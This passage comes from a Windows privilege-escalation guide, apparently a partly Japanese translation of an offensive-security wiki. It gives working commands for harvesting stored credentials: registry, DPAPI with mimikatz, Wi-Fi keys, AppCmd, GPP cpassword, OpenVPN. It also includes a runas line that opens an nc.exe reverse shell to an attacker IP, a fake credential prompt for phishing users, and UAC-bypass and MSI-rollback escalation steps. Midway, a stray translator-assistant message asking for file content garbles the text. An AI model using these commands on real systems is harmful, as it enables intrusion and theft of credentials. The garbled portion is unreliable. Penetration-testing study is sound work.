フォルダ `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` にある `WSL` のファイルシステムを参照できます。

## Windows 資格情報

### Winlogon 資格情報
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows Vaultは、サーバー、ウェブサイト、その他のプログラム用のユーザー資格情報を格納します。これらは**Windows**が**log in the users automaticall**yできるものです。最初は、ユーザーがFacebookやTwitter、Gmailなどの資格情報を保存してブラウザ経由で自動ログインするように見えるかもしれませんが、そうではありません。

Windows Vaultは、Windowsがユーザーに自動ログインできる資格情報を保存します。つまり、任意の**Windows application that needs credentials to access a resource**（サーバーやウェブサイト）が、**can make use of this Credential Manager**およびWindows Vaultを利用して、ユーザーが毎回ユーザー名とパスワードを入力する代わりに保存された資格情報を使用できる、ということです。

アプリケーションがCredential Managerと連携しない限り、特定のリソースの資格情報を使用することはできないと思います。したがって、アプリケーションがvaultを利用したい場合は、デフォルトのストレージvaultからそのリソースの資格情報を取得するために、何らかの方法で**communicate with the credential manager and request the credentials for that resource**する必要があります。

マシンに保存されている資格情報を一覧表示するには、`cmdkey`を使用します。
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
その後、保存された資格情報を使用するために `runas` を `/savecred` オプション付きで使用できます。以下の例では、SMB 共有経由でリモートのバイナリを呼び出しています。
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
`runas` を提供された資格情報のセットで使用する。
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Note that mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), or from [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

The **Data Protection API (DPAPI)** は、主に Windows オペレーティングシステム内で、非対称のプライベートキーの対称暗号化に使用されるデータの対称暗号化手法を提供します。この暗号化は、エントロピーに大きく寄与するユーザーまたはシステムのシークレットを利用します。

**DPAPI enables the encryption of keys through a symmetric key that is derived from the user's login secrets**。システム暗号化が関わるシナリオでは、システムのドメイン認証シークレットを利用します。

DPAPI を使用した暗号化されたユーザーの RSA キーは、`%APPDATA%\Microsoft\Protect\{SID}` ディレクトリに格納されます。ここで `{SID}` はユーザーの [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) を表します。**The DPAPI key, co-located with the master key that safeguards the user's private keys in the same file** は通常 64 バイトのランダムデータで構成されます。（このディレクトリへのアクセスは制限されており、CMD の `dir` コマンドでは内容を一覧表示できませんが、PowerShell では一覧表示できます。）
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
適切な引数（`/pvk` または `/rpc`）を指定して、**mimikatz module** の `dpapi::masterkey` を使用して復号できます。

通常、**credentials files protected by the master password** は次の場所にあります:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
適切な `/masterkey` を指定して **mimikatz module** `dpapi::cred` を使用して復号できます。\\
root の場合、`sekurlsa::dpapi` モジュールを使用して **extract many DPAPI** **masterkeys** を **memory** から抽出できます（root の場合）。

{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell の資格情報

**PowerShell の資格情報** は、暗号化された資格情報を便利に保存する手段として、**スクリプト**や自動化タスクでよく使用されます。これらの資格情報は **DPAPI** を使用して保護されており、通常は作成された同じユーザーが同じコンピューター上でのみ復号できます。

ファイルに含まれる PS の資格情報を **decrypt** するには、次のようにします:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### 保存された RDP 接続

それらは `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
および `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### 最近実行されたコマンド
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **リモートデスクトップ資格情報マネージャー**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
適切な `/masterkey` を指定して **Mimikatz** の `dpapi::rdg` モジュールを使用し、**任意の .rdg ファイルを復号**してください。\
Mimikatz の `sekurlsa::dpapi` モジュールを使うと、メモリから多くの **DPAPI masterkeys** を抽出できます。

### Sticky Notes

People often use the StickyNotes app on Windows workstations to **save passwords** and other information, not realizing it is a database file. This file is located at `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` and is always worth searching for and examining.

### AppCmd.exe

**Note that to recover passwords from AppCmd.exe you need to be Administrator and run under a High Integrity level.**\
**AppCmd.exe** is located in the `%systemroot%\system32\inetsrv\` directory.\
If this file exists then it is possible that some **credentials** have been configured and can be **recovered**.

This code was extracted from [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe` が存在するか確認する。\
インストーラーは**SYSTEM権限で実行されます**, 多くは**DLL Sideloading (情報元** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## ファイルとレジストリ (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH ホストキー
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH keys in registry

SSH private keys はレジストリキー `HKCU\Software\OpenSSH\Agent\Keys` に保存されていることがあるため、そこに興味深いものがないか確認してください:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
そのパス内にエントリが見つかった場合、それはおそらく保存された SSH キーです。これは暗号化されて保存されていますが、[https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) を使えば簡単に復号できます。\
この手法の詳細はこちら: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

`ssh-agent` サービスが実行されておらず、起動時に自動的に開始したい場合は次を実行してください:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> この手法はもう有効ではないようです。ssh keys を作成して `ssh-add` で追加し、ssh でマシンにログインしてみましたが、レジストリ HKCU\Software\OpenSSH\Agent\Keys は存在せず、procmon は非対称鍵認証中に `dpapi.dll` の使用を検出しませんでした。

### 放置されたファイル
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
これらのファイルは **metasploit** を使用して検索することもできます: _post/windows/gather/enum_unattend_

例の内容:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM のバックアップ
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### クラウド認証情報
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

**SiteList.xml** というファイルを検索してください

### キャッシュされた GPP パスワード

以前、Group Policy Preferences (GPP) を使って複数のマシンにカスタムのローカル管理者アカウントを展開できる機能が利用可能でした。しかし、この方法には重大なセキュリティ上の欠陥がありました。まず、SYSVOL に XML ファイルとして保存されている Group Policy Objects (GPOs) は任意のドメインユーザーがアクセスできました。次に、これらの GPP 内のパスワードは公開されているデフォルトキーを使って AES256 で暗号化されており、任意の認証済みユーザーによって復号可能でした。これにより、ユーザーが権限を昇格させる可能性があり、重大なリスクとなりました。

このリスクを軽減するため、ローカルにキャッシュされた GPP ファイルをスキャンし、"cpassword" フィールドが空でないものを検出する関数が開発されました。該当するファイルが見つかると、その関数はパスワードを復号し、カスタム PowerShell オブジェクトを返します。このオブジェクトは GPP とファイルの場所に関する情報を含み、脆弱性の特定と対処に役立ちます。

次のファイルは、`C:\ProgramData\Microsoft\Group Policy\history` または _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history**（Windows Vista より前）_ を検索してください：

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword を復号するには:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
crackmapexec を使用して passwords を取得する:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web 構成
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
credentials を含む web.config の例:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN の認証情報
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### ログ
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### credentials を尋ねる

もしユーザーが知っている可能性があると思う場合、常に **ユーザーに自身の credentials、あるいは別のユーザーの credentials を入力するよう頼む** ことができます (注意：クライアントに直接**尋ねる**ことで**credentials**を求めるのは本当に**危険**です):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **credentials** を含む可能性のあるファイル名

以前、**passwords** を **clear-text** または **Base64** で含んでいた既知のファイル
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
指定されたファイルの内容が提供されていません。  
src/windows-hardening/windows-local-privilege-escalation/README.md の内容を貼ってください。受け取ったら、指示に従って英語部分を日本語に翻訳して返します。
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### RecycleBin の資格情報

Bin（ごみ箱）内に資格情報がないかも確認してください

複数のプログラムに保存された**パスワードを復元する**には、次を使用できます: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### レジストリ内

**資格情報を含むその他の可能性のあるレジストリキー**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### ブラウザの履歴

パスワードが保存されている可能性のある **Chrome or Firefox** の db を確認してください。\
また、ブラウザの履歴、ブックマーク、お気に入りも確認してください。そこにパスワードが保存されていることがあります。

Tools to extract passwords from browsers:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

Component Object Model (COM) は、Windows オペレーティングシステム内に組み込まれた技術で、異なる言語で書かれたソフトウェアコンポーネント間の相互通信を可能にします。各 COM コンポーネントは class ID (CLSID) によって識別され、各コンポーネントは interface ID (IIDs) によって識別される 1 つ以上のインターフェイスを通じて機能を公開します。

COM クラスとインターフェイスは、それぞれ **HKEY\CLASSES\ROOT\CLSID** および **HKEY\CLASSES\ROOT\Interface** の下でレジストリに定義されます。このレジストリは **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** をマージして作成され、**HKEY\CLASSES\ROOT** になります。

レジストリ内の CLSID の中には子レジストリ **InProcServer32** があり、そこには **default value** が DLL を指す形で格納されており、**ThreadingModel** という値があります。この値は **Apartment**（Single-Threaded）、**Free**（Multi-Threaded）、**Both**（Single or Multi）、または **Neutral**（Thread Neutral）のいずれかになり得ます。

![](<../../images/image (729).png>)

基本的に、実行される DLL のいずれかを上書きできる場合、その DLL が別のユーザーによって実行される際に escalate privileges できる可能性があります。

To learn how attackers use COM Hijacking as a persistence mechanism check:


{{#ref}}
com-hijacking.md
{{#endref}}

### **ファイルとレジストリ内の一般的なパスワード検索**

**Search for file contents**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**特定のファイル名を持つファイルを検索する**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**レジストリでキー名とパスワードを検索する**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### パスワードを検索するツール

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** プラグインで、被害者内で資格情報を検索するすべての **automatically execute every metasploit POST module that searches for credentials** を実行するために作成しました。\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) は、このページで言及されたパスワードを含むすべてのファイルを自動的に検索します。\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) はシステムからパスワードを抽出するもう一つの優れたツールです。

ツール [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) は、このデータを平文で保存するいくつかのツール（PuTTY、WinSCP、FileZilla、SuperPuTTY、RDP）の **sessions**, **usernames** and **passwords** を検索します。
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Imagine that **a process running as SYSTEM open a new process** (`OpenProcess()`) with **full access**. The same process **also create a new process** (`CreateProcess()`) **with low privileges but inheriting all the open handles of the main process**.\
Then, if you have **full access to the low privileged process**, you can grab the **open handle to the privileged process created** with `OpenProcess()` and **inject a shellcode**.\
[Read this example for more information about **how to detect and exploit this vulnerability**.](leaked-handle-exploitation.md)\
[Read this **other post for a more complete explanation on how to test and abuse more open handlers of processes and threads inherited with different levels of permissions (not only full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

共有メモリセグメント、すなわち **pipes** は、プロセス間の通信やデータ転送を可能にします。

Windowsは**Named Pipes**という機能を提供しており、関連のないプロセス間でも、場合によってはネットワーク越しにデータを共有できます。これはクライアント/サーバー型のアーキテクチャに似ており、役割は**named pipe server**と**named pipe client**として定義されます。

クライアントがパイプを通じてデータを送信すると、そのパイプを設定した**server**は、必要な**SeImpersonate**権限を持っている場合に**clientのアイデンティティを引き受ける**ことができます。あなたが模倣できるパイプ経由で通信する**特権プロセス**を特定できれば、あなたが作成したパイプとそのプロセスがやり取りを行った際にそのプロセスのアイデンティティを引き受けて、**より高い権限を得る**機会が生まれます。このような攻撃を実行する手順については、[**here**](named-pipe-client-impersonation.md)および[**here**](#from-high-integrity-to-system)のガイドが参考になります。

また、次のツールは burp のようなツールで named pipe の通信をインターセプトすることを可能にします: [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **そしてこのツールは privescs を見つけるためにすべてのパイプを列挙・表示することができます:** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## その他

### Windowsで何かを実行してしまう可能性のあるファイル拡張子

次のページを参照してください: [https://filesec.io/](https://filesec.io/)

### **コマンドライン上のパスワードの監視**

ユーザーとしてシェルを取得したとき、スケジュールされたタスクやその他のプロセスがコマンドライン上で資格情報を渡す（pass credentials on the command line）ことがあります。以下のスクリプトは、プロセスのコマンドラインを2秒ごとに取得し、現在の状態を前回の状態と比較して差分を出力します。
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## プロセスからのパスワードの窃取

## 低権限ユーザーからNT\AUTHORITY SYSTEMへの昇格 (CVE-2019-1388) / UAC Bypass

グラフィカルインターフェース（コンソールまたはRDP経由）にアクセスでき、UACが有効な場合、Microsoft Windowsの一部のバージョンでは、低権限ユーザーからターミナルや "NT\AUTHORITY SYSTEM" のような他のプロセスを実行できる可能性があります。

これにより、同じ脆弱性を使って同時に権限昇格とUACのバイパスが可能になります。さらに、何もインストールする必要はなく、プロセス中に使用されるバイナリは署名されておりMicrosoftによって発行されています。

影響を受けるシステムの一部は以下の通りです:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
この脆弱性を悪用するには、次の手順を実行する必要があります:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
## Administrator の Medium から High Integrity Level への昇格 / UAC Bypass

Integrity Levels について **学ぶ** には、次を読んでください:


{{#ref}}
integrity-levels.md
{{#endref}}

次に **UAC と UAC bypass** について学ぶには、こちらを読んでください:


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## 任意フォルダの削除/移動/名前変更から SYSTEM EoP へ

この手法は [**このブログ投稿**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) で説明されており、exploit コードは [**ここで入手可能**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs) です。

攻撃の概要は、Windows Installer の rollback 機能を悪用して、アンインストール時に正当なファイルを悪意のあるものに置き換えることにあります。これには、攻撃者が `C:\Config.Msi` フォルダをハイジャックするための **悪意のある MSI インストーラー** を作成し、それが他の MSI パッケージのアンインストール時に Windows Installer が rollback ファイルを格納するために使用されることを利用します。rollback ファイルは改ざんされ、悪意のあるペイロードを含むようになります。

手法の要約は次の通りです:

1. **Stage 1 – ハイジャックの準備（`C:\Config.Msi` を空にする）**

- Step 1: MSI をインストールする
- 書き込み可能なフォルダ（`TARGETDIR`）に無害なファイル（例: `dummy.txt`）をインストールする `.msi` を作成する。
- インストーラーを **"UAC Compliant"** とマークして、**非管理者ユーザー** が実行できるようにする。
- インストール後にファイルへの **handle** を開いたままにしておく。

- Step 2: アンインストールを開始する
- 同じ `.msi` をアンインストールする。
- アンインストール処理はファイルを `C:\Config.Msi` に移動し、`.rbf` ファイルにリネームして rollback バックアップを作成し始める。
- `GetFinalPathNameByHandle` を使って開いているファイルハンドルをポーリングし、ファイルが `C:\Config.Msi\<random>.rbf` になった時を検出する。

- Step 3: カスタム同期
- `.msi` に **カスタムアンインストールアクション (`SyncOnRbfWritten`)`** を含め、これが:
- `.rbf` が書き込まれたことをシグナルする。
- 続行前に別のイベントを **待機** する。

- Step 4: `.rbf` の削除をブロック
- シグナルを受け取ったら、`FILE_SHARE_DELETE` なしで `.rbf` ファイルを **オープン** し、これにより **削除を防ぐ**。
- その後アンインストーラーへ戻ってシグナルを送ると、Windows Installer は `.rbf` を削除できず、フォルダ内の全内容を削除できないため、**`C:\Config.Msi` は削除されない**。

- Step 5: `.rbf` を手動で削除
